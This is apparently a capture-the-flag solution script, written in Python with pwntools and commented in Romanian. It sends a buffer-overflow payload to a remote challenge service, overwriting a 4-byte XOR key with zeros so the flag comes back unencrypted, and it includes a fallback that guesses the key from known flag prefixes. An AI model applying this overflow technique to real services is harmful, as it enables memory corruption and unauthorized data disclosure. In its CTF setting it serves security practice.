#!/usr/bin/env python3
from pwn import *

HOST = "10.213.0.102"
PORT = 54514

def exploit():
    # Stabilire conexiune cu target-ul
    print("[*] Conectare la {}:{}".format(HOST, PORT))
    conn = remote(HOST, PORT)
    
    # Așteptăm prompt-ul de la server
    conn.recvuntil(b"Any other words at the end?\n")
    print("[*] Prompt de input detectat")
    
    # Construim payload-ul pentru overflow
    # Buffer-ul local_3c = 32 bytes, variabila local_1c = 4 bytes
    # Obiectiv: suprascriere local_1c (cheie XOR) cu valori controlate
    # Folosim 0x00 pentru a anula criptarea XOR
    payload = b"A" * 32  # Fill buffer local_3c
    payload += b"\x00\x00\x00\x00"  # Overwrite local_1c -> key = 0
    
    print("[*] Se trimite payload-ul de overflow...")
    conn.sendline(payload)
    
    # Recepționăm flag-ul după aplicarea XOR
    conn.recvuntil(b"Here is the encrypted flag\n")
    encrypted_hex = conn.recvline().strip().decode()
    print("[+] Răspuns primit: {}".format(encrypted_hex))
    
    # Cu cheia setată la 0x00, operația XOR nu modifică datele
    # Astfel putem extrage flag-ul direct
    encrypted_bytes = bytes.fromhex(encrypted_hex)
    
    # Decriptare trivială (XOR cu 0 = identitate)
    flag = encrypted_bytes.decode('ascii', errors='ignore')
    print("\n[+] FLAG OBȚINUT: {}".format(flag))
    
    conn.close()
    return flag

def alternative_exploit():
    """
    Abordare alternativă: multiple request-uri cu analiză
    pentru identificarea cheii prin pattern matching
    """
    print("\n[*] Testare metodă secundară...")
    
    # Conexiune standard, fără overflow intentionat
    conn = remote(HOST, PORT)
    conn.recvuntil(b"Any other words at the end?\n")
    conn.sendline(b"test")
    
    conn.recvuntil(b"Here is the encrypted flag\n")
    encrypted_hex = conn.recvline().strip().decode()
    encrypted_bytes = bytes.fromhex(encrypted_hex)
    
    print("[*] Date criptate: {}".format(encrypted_hex))
    
    # Testăm prefixe comune pentru flag-uri CTF
    possible_starts = [b"CTF{", b"flag{", b"FLAG{"]
    
    for start in possible_starts:
        # Derivăm cheia XOR din primii bytes
        key = []
        for i in range(min(4, len(start))):
            key.append(encrypted_bytes[i] ^ start[i])
        
        print(f"[*] Test prefix {start}: key candidate = {key}")
        
        # Aplicăm cheia pe întregul mesaj criptat
        decrypted = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            decrypted.append(byte ^ key[i % len(key)])
        
        try:
            flag = decrypted.decode('ascii')
            if flag.isprintable():
                print(f"[+] Candidat valid: {flag}")
        except:
            pass
    
    conn.close()

if __name__ == "__main__":
    print("=" * 60)
    print("CTF Flag Decryptor - Buffer Overflow Exploit")
    print("=" * 60)
    
    try:
        # Prima strategie: overflow pentru control asupra cheii
        flag = exploit()
    except Exception as e:
        print(f"[-] Eroare exploit primar: {e}")
        print("[*] Comutare la abordare secundară...")
        try:
            alternative_exploit()
        except Exception as e2:
            print(f"[-] Eroare exploit secundar: {e2}")
    
    print("\n[*] Done!")